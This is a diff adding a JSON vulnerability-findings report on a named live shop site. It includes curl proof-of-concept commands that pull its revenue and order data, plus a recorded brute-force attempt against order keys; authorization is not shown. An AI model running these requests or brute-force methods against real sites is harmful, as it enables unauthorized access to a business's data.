@@ -1,0 +1,103 @@
+{
+  "target": "https://yujuqq.top/shop/",
+  "domain": "yujuqq.top",
+  "updated": "2026-07-13T12:49:49.626681Z",
+  "findings": [
+    {
+      "id": "Y1",
+      "severity": "HIGH",
+      "category": "info_disclosure",
+      "title": "getcount 未授权泄露经营数据",
+      "detail": "orders=280 money=38814.9 site=22 yxts=255；需首页会话后 ajax 可访问",
+      "endpoint": "GET /shop/ajax.php?act=getcount",
+      "exploitable": true,
+      "poc": "curl -sk -c ck -b ck -H \"X-Requested-With: XMLHttpRequest\" -H \"Referer: https://yujuqq.top/shop/\" \"https://yujuqq.top/shop/ajax.php?act=getcount\"",
+      "evidence": {
+        "orders": "280",
+        "orders1": "280",
+        "money": 38814.9,
+        "site": "22",
+        "yxts": 255
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    },
+    {
+      "id": "Y2",
+      "severity": "HIGH",
+      "category": "idor",
+      "title": "order 卡密 IDOR（需 skey，kminfo 未抓到）",
+      "detail": "POST ajax.php?act=order {id,skey}；skey=md5(id+SYS_KEY+id)；10k 词×280 id 爆破暂无命中",
+      "endpoint": "POST /shop/ajax.php?act=order",
+      "exploitable": false,
+      "poc": "curl -sk -X POST -d \"id=1&skey=test\" -H \"Referer: https://yujuqq.top/shop/?mod=query\" \"https://yujuqq.top/shop/ajax.php?act=order\"",
+      "evidence": {
+        "response": "验证失败",
+        "skey_formula": "md5(id+SYS_KEY+id)",
+        "kminfo_captured": false
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    },
+    {
+      "id": "Y3",
+      "severity": "MEDIUM",
+      "category": "availability",
+      "title": "ajax query 接口 HTTP 500",
+      "detail": "POST act=query type+qq 全类型 500；阻断 queryOrder JSON 泄露 skey 主路径",
+      "endpoint": "POST /shop/ajax.php?act=query",
+      "exploitable": false,
+      "evidence": {
+        "http_status": 500
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    },
+    {
+      "id": "Y4",
+      "severity": "HIGH",
+      "category": "idor",
+      "title": "api.php search 疑似 IDOR（GET 被封）",
+      "detail": "彩虹源码 act=search&id= 无鉴权；本站 GET api.php 连接重置，POST 返回 No Act",
+      "endpoint": "GET /shop/api.php?act=search&id=",
+      "exploitable": false,
+      "evidence": {
+        "get": "connection reset",
+        "post": "{\"code\":-5,\"msg\":\"No Act!\"}"
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    },
+    {
+      "id": "Y5",
+      "severity": "MEDIUM",
+      "category": "exposure",
+      "title": "后台/安装/定时任务面暴露",
+      "detail": "sup/user 登录页、cron.php、install（已锁）、other/submit.php 公网可达",
+      "endpoint": "/shop/sup/, /shop/cron.php, /shop/install/",
+      "exploitable": false,
+      "evidence": {
+        "cron": "监控密钥不正确",
+        "install": "install.lock 存在"
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    },
+    {
+      "id": "Y6",
+      "severity": "LOW",
+      "category": "catalog",
+      "title": "商品目录未授权枚举",
+      "detail": "getclass/gettool 可列出 QQ/飞机/美卡类商品与价格",
+      "endpoint": "GET /shop/ajax.php?act=getclass|gettool",
+      "exploitable": true,
+      "evidence": {
+        "sample_cids": [
+          "89",
+          "35",
+          "36",
+          "8",
+          "7"
+        ],
+        "sample_tid": 1257,
+        "price": 140
+      },
+      "ts": "2026-07-13T12:49:49.626681Z"
+    }
+  ]
+}
